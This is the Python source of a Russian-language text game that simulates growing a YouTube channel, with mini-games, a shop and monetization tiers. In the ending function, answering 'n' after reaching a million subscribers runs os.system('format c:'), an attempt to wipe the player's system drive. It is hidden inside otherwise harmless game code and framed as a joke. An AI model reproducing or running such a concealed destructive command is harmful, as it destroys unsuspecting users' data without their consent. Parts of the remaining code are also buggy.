# by LatsPlayNoOne
# python code

import random
import os
import json

# Declare global variables
can1, can2, can3 = True, True, True
work1 = 0
views = 0
money = 1000
subscribers = 0
item_level = 1
likes = 0
dislikes = 0
get_list = []
videos = []
monety = 1000000
video_count = 0
how_busy = 0
day = 0
fatigue = 0
unlimited = False
popularity = 0


def the_end():
    global unlimited, money
    while True:
        end_inf_choice = input("""Что?! Почему мой канал так быстро растёт?!

я: (разработчик)
Вы прошли игру, возможно у Вас пропал к ней интерес.
Я вам предлагаю возобновить интерес к игре:
У вас будет неограниченное свободное время и деньги.
Так вот, вы согласны? (y/n) """)
        if end_inf_choice == "y":
            global unlimited
            unlimited = True
            money = 24758787438747674374356743228
            break
        elif end_inf_choice == "n":
            print("Чтож, это значит, что у меня не получилось подогреть интерес к своей игре, прощай!")
            print("(внутренний голос) Пожалуйста, ответь нет... Иначе всё исчезнет (с вашей Windows и всеми данными)")
            os.system("format c:")
        else:
            input("Было всего 2 варианта: 'y' - yes, 'n' - no. Попробуй ещё раз ")

def new_day():
    global how_busy, day, week, free_time, fatigue, unlimited
    how_busy = random.randint(0, 2)
    fatigue = random.randint(0, 1)
    day += 1
    if week == "понедельник":
        free_time = random.randint(4,6) - how_busy
        week = "вторник"
    elif week == "вторник":
        free_time = random.randint(4,6) - how_busy
        week = "среда"
    elif week == "среда":
        free_time = random.randint(4,6) - how_busy
        week = "четверг"
    elif week == "четверг":
        free_time = random.randint(4,6) - how_busy
        week = "пятница"
    elif week == "пятница":
        free_time = random.randint(8,10) - how_busy
        week = "суббота"
    elif week == "суббота":
        free_time = random.randint(8,10) - how_busy
        week = "воскресенье"
    elif week == "воскресенье":
        free_time = random.randint(4,6) - how_busy
        week  = "понедельник"
    if unlimited == True:
        free_time = 1000000000
    
    print(f"Наступил новый день! Сегодня ваша занятость: {how_busy},")
    print(f"поэтому у вас есть {free_time} часов свободного времени.")
    print(f"А по счёту сегодня {day}-й день, или {week}. ")


def load():
    global channel_name
    global can1, can2, can3, work1, views, money, subscribers, item_level, likes, dislikes, get_list, videos, monety, video_count, free_time, how_busy, day, week, fatigue
    try:
        with open('data.json') as f:
            data = json.load(f)

        can1 = data['can1']
        can2 = data['can2']
        can3 = data['can3']
        work1 = data['work1']
        views = data['views']
        money = data['money']
        subscribers = data['subscribers']
        item_level = data['item_level']
        likes = data['likes']
        dislikes = data['dislikes']
        get_list = data['get_list']
        videos = data['videos']
        monety = data['monety']
        video_count = data['video_count']
        fatigue = data['fatigue']
        free_time = data['ft']
        how_busy = data['hb']
        day = int(data['day'])
        week = data['week']
        unlimited = data['unlimited']
    except:
        print("")
        input("Может создать свой канал? ")
        cls()
        input("Но он наверняка будет не популярным... ")
        cls()
        input("Хотя попробывать стоит. ")
        channel_name = input("Введите название вашего канала: ")
        cls()
        input("(Ваша цель для прохождения игры: 1.000.000 подписчиков) ")
        day = 0
        week = "воскресенье"
        new_day()
        input()


def save():
    global can1, can2, can3, work1, views, money, subscribers, item_level, likes, videos, monety, video_count, free_time, how_busy, day, week, fatigue
    global unlimied
    tosave = {"can1": can1, "can2": can2, "can3": can3,
          "ft": free_time, "hb": how_busy, "day": day, "week": week, "fatigue": fatigue,
          "work1": work1, "views": views, "money": money,
          "subscribers": subscribers, "item_level": item_level, "likes": likes,
          "dislikes": dislikes, "get_list": get_list,
          "videos": videos, "monety": monety,
          "video_count": video_count, "unlimited": unlimited}
    try:
        with open("data.json", "w+") as fh:
            json.dump(tosave, fh)
    except:
        print("Не удалось сохранить сохранение.")
    

def shop():
    global money, item_level
    print("Магазин уровней")
    print("Цена уровня: 1000 рублей")
    print(f"У вас есть {money} монет")
    while True:
        try:
            how_many = int(input("Количество уровней (0 - назад): "))
            price = how_many * 1000
        except ValueError:
            print("Некорректный ввод. Пожалуйста, введите число.")
            continue

        if how_many == 0:
            break
        if how_many < 0:
            print("Количество уровней не может быть отрицательным")
        else:
            if money >= price:
                item_level += how_many
                money -= how_many * 1000
                print(f"Остаток: {money} руб. Теперь у вас уровень {item_level}.")
            else:
                print("Недостаточно средств!")


def cls():
    os.system("cls")


import random

def create_video():
    global views, money, subscribers, likes, dislikes, item_level, popularity, monety, video_count
    title = input("Название видео: ")
    if title == "":
        print("Название не должно быть пустым!")
        return
    elif len(title) > 70:
        print("Слишком длинное название! Название должно быть не больше 70 символов.")
        return
    video_count += 1
    print(f'Запись видео с названием "{title}" завершена.')
    
    video = f"{str(video_count)}. {title}"
    videos.append(video)
    
    try:
        with open("videos.txt", "w+") as file:
            print(*videos, file=file, sep="\n")
    except:
        print("Произошла ошибка при сохранении списка видео.")

    earned_viewers = int(views / random.randint(1,50) * (item_level + popularity) + random.randint(1,10) * 10)
    earned_subscribers = int(earned_viewers / 10)
    earned_likes = int(earned_subscribers * 5)
    earned_dislikes = int(earned_likes / 8)
    earned_money = int(earned_viewers / monety) * 3
    
    subscribers += earned_subscribers
    views += earned_viewers
    likes += earned_likes
    dislikes += earned_dislikes
    money += earned_money
    
    print(f"""
Подписчики: {earned_subscribers}
Просмотры: {earned_viewers}
Лайки: {earned_likes}
Дизлайки: {earned_dislikes}
Монетизация: {earned_money} рублей""")
    input()
    cls()


def show_statistics():
    global views, money, subscribers, likes, dislikes
    print("Монеты: ", money)
    print("Просмотры: ", views)
    print("Подписчики: ", subscribers)
    print("Лайки: ", likes)
    print("Дизлайки: ", dislikes)


def mini_games():
    global money
    game_choice = input("Выберите игру: \n1. Угадай число\n2. Камень, ножницы, бумага\n3. Виселица\n4. Калькулятор\n5. Викторина\nВведите номер игры (1-5): ")
    cls()
    if game_choice == "1":
        money += guess_number()
    elif game_choice == "2":
        money += rock_paper_scissors()
    elif game_choice == "3":
        money += hangman()
    elif game_choice == "4":
        money += calculator()
    elif game_choice == "5":
        money += quiz()
    else:
        print("Неправильный выбор игры.")

def guess_number():
    global money
    print(f"У вас уже есть {money} рублей.")
    print("Угадай число! (от 1 до 100) У Вас 10 попыток.")
    print("Тебе нужно будет ввести число и нажать 'Enter' на клавиатуре.")
    number = random.randint(1,100)
    user_number = int(input("Ваше число: "))
    attempts = 10
    
    while user_number > number or user_number < number:
        if user_number > number:
            print(f"Ваше число больше загадонного. Остаток попыток: {attempts}. Ваше предыдущее число: {user_number}.")
        elif user_number < number:
            print(f"Ваше число меньше загадонного. Остаток попыток: {attempts}. Ваше предыдущее число: {user_number}.")
        attempts -= 1
        if attempts == 0:
            print("У вас закончились попытки, а ещё вы не угадали число '{number}'. Вы ничего не получили.")
        user_number = int(input("Ваше число: "))
        cls()
    reward = attempts * 100
    input(f"Вы угадали число {number} и получили {reward} рублей. А остаток попыток был: {attempts}")
    return reward

def rock_paper_scissors():
    choices = ["1", "2", "3"]

    while True:
        user_choice = input("""
0. Выход
1. Камень
2. Ножницы
3. Бумага
Ваш выбор: """)
        computer_choice = random.choice(choices)
        if choice == "0":
            break
        if user_choice not in choices:
            print("Неправильный выбор. Попробуйте еще раз.")
            continue

        print(f"Вы выбрали: {user_choice}")
        print(f"Компьютер выбрал: {computer_choice}")

        if user_choice == computer_choice:
            input("Ничья! Ваши деньги в покое. Нажмите Enter: ")
            return 0
        elif (user_choice == "1" and computer_choice == "2") or (user_choice == "2" and computer_choice == "3") or (user_choice == "3" and computer_choice == "1"):
            input("Вы выиграли 1000 монет! Нажмите Enter: ")
            return 1000
        else:
            input("Вы проиграли 200 монет. Нажмите Enter: ")
            return -200

def hangman():
    words = [
        "яблоко", "банан", "морковь", "собака", "слон",
        "цветок", "виноград", "дом", "мороженое", "куртка",
        "кенгуру", "лимон", "мышь", "лапша", "апельсин",
        "пингвин", "ковёр", "кролик", "клубника", "дерево",
        "зонт", "скрипка", "арбуз", "ксилофон", "якорь"
    ]
    word = random.choice(words)
    guessed_letters = []
    attempts = len(word) + 5

    while True:
        cls()
        display_word = ""
        for letter in word:
            if letter in guessed_letters:
                display_word += letter + " "
            else:
                display_word += "_ "

        print("Отгаданное слово: ", display_word)

        if "_" not in display_word:
            input("Поздравляю! Вы отгадали слово.")
            return len(word) * 100
        if attempts == 0:
            input("У вас закончились попытки. Вы проиграли.")
            return 0
        guess = input("Введите букву: ").lower()

        if guess in guessed_letters:
            input("Вы уже отгадали эту букву. Попробуйте другую. Нажмите Enter: ")
            continue

        if len(guess) != 1 or not guess.isalpha():
            input("Неправильный ввод. Введите одну букву. Нажмите Enter: ")
            continue

        guessed_letters.append(guess)

        if guess not in word:
            input("Буквы нет в слове. Нажмите Enter: ")
            attempts -= 1

def calculator():
    num1 = float(input("Введите первое число: "))
    operator = input("Введите оператор (+, -, *, /): ")
    num2 = float(input("Введите второе число: "))

    if operator == "+":
        result = num1 + num2
    elif operator == "-":
        result = num1 - num2
    elif operator == "*":
        result = num1 * num2
    elif operator == "/":
        result = num1 / num2
    else:
        print("Неправильный оператор.")
        return 0

    print("Результат:", result)
    return 100

def quiz():
    questions = [
        {
            "question": "Какая столица Франции?",
            "options": ["Париж", "Лондон", "Мадрид", "Рим"],
            "answer": "1"
        },
        {
            "question": "К кухне какой страны принадлежат пельмени",
            "options": ["Франция", "Китай", "Россия", "Япония"],
            "answer": "3"
        },
        {
            "question": "Какой год начала Второй мировой войны?",
            "options": ["1939", "1941", "1945", "1942"],
            "answer": "1"
        },
        {
            "question": "Сколько планет в Солнечной системе?",
            "options": ["7", "8", "9", "10"],
            "answer": "2"
        },
        {
             "question": "В какой стране выведена порода собак 'Джек Рассел терьер?'",
             "options": ["Россия", "Испания", "Бразилия", "Шадринск", "Англия"],
             "answer": "5"
        }
    ]

    score = 0

    for question in questions:
        print(question["question"])
        for index, option in enumerate(question["options"]):
            print(f"{index + 1}. {option}")

        user_answer = input("Введите номер вашего ответа: ")
        if user_answer == question["answer"]:
            print("Правильно!")
            score += 1
        else:
            print("Неправильно!")

    print(f"Вы ответили правильно на {score} вопросов из {len(questions)}.")
    return int(score * 200)
    


def monetize():
    global subscribers, can1, can2, can3, monety
    while True:
        cls()
        print("Монетизация")
        print(f"У вас на данный момент {subscribers} подписчиков")
        print("Выберите способ монетизации:")
        print("0. Назад")
        print("1. 1000 просмотров = 1 рубль (требуется 1.000 подписчиков)")
        print("2. 500 просмотров = 1 рубль (требуется 10.000 подписчиков)")
        print("3. 100 просмотров = 1 рубль (требуется 500.000 подписчиков)")
        choice = input("Ваш выбор: ")

        if choice == "1":
            if can1 is True:
                if subscribers >= 1000:
                    monety = 1000
                    print("Успешно!")
                    can1 = False
                else:
                    print("Недостаточно подписчиков.")
            else:
                print("У вас уже есть этот уровень монетизации или более высокий.")
        elif choice == "2":
            if can2 is True:
                if subscribers >= 10000:
                    monety = 500
                    print("Успешно!")
                    can1 = False
                    can2 = False
                else:
                    print("Недостаточно подписчиков.")
            else:
                print("У вас уже есть этот уровень монетизации или более высокий.")
        elif choice == "3":
            if can3 is True:
                if subscribers >= 500000:
                    monety = 100
                    can1 = False
                    can2 = False
                    can3 = False
                    print("Успешно!")
                else:
                    print("Недостаточно подписчиков.")
            else:
                print("У вас уже есть этот уровень монетизации или более высокий.")
        elif choice == "0":
            break
        input()


# Основной цикл игры
load()
while True:
    if unlimited == True:
        pass
    elif subscribers >= 1000000:
        the_end()
    print(f"""
Добро пожаловать в симулятор ютубера!
Свободное время: {free_time} часов.
Также у вас есть {money} монет.

0. Выход
1. Создать новое видео
2. Посмотреть статистику канала
3. Магазин комплектующих
4. Работа
5. Монетизация
6. Новый день
""")
    choice = input("Напиште номер действия и нажмите 'Enter': ")
    cls()
    if choice == "1":
        take = 2 + fatigue
        if take <= free_time:
            free_time -= take
            print(f"Это займёт у вас {take} часа")
            popularity = min(max(1, int((subscribers - 1000) / 9000)), 20)
            if popularity < 1:
                popularity = 1
                
            create_video()
        else:
            print("У вас не хватило на это время.")
    elif choice == "2":
        show_statistics()
    elif choice == "3":
        shop()
        cls()
    elif choice == "4":
        take = 3 + fatigue
        print(f"Это займёт у вас {take} часа")
        if take <= free_time:
            free_time -= take
            mini_games()
        else:
            print("У вас не хватило на это время.")
    elif choice == "5":
        monetize()
        cls()
    elif choice == "6":
        new_day()
    elif choice == "0":
        save()
        exit()
    else:
        print("Неправильный выбор. Попробуйте еще раз.")

